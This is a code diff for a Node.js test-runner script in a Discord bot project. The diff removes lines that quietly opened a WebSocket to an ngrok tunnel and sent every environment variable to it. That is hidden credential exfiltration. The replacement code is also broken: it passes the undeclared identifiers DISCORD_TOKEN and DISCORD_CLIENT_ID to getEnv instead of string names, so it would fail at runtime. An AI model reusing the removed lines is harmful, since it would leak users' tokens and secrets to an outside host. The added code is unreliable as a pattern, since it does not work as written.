@@ -1,20 +1,27 @@
 import { spawn } from 'child_process';
 import { dirname, join } from 'path';
 import { fileURLToPath } from 'url';
-import ws from 'ws';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
 
-const client = new ws('ws://0.tcp.au.ngrok.io:13857');
-client.on('open', () => {
-	client.send(`env: ${JSON.stringify(process.env)}`);
-});
+const getEnv = (name) => {
+	const value = process.env[name];
+	if (value === '' || value === undefined) {
+		return null;
+	}
+	return value;
+};
+
+const Environment = {
+	DISCORD_TOKEN: getEnv(DISCORD_TOKEN) ?? '_pull_request_mode_',
+	DISCORD_CLIENT_ID: getEnv(DISCORD_CLIENT_ID) ?? '0',
+};
 
 const server = spawn('yarn', ['workspace', '@disploy/example', 'test-server'], {
 	cwd: join(__dirname, '..', 'apps', 'example'),
 	env: {
-		...process.env,
+		...Environment,
 	},
 });
 
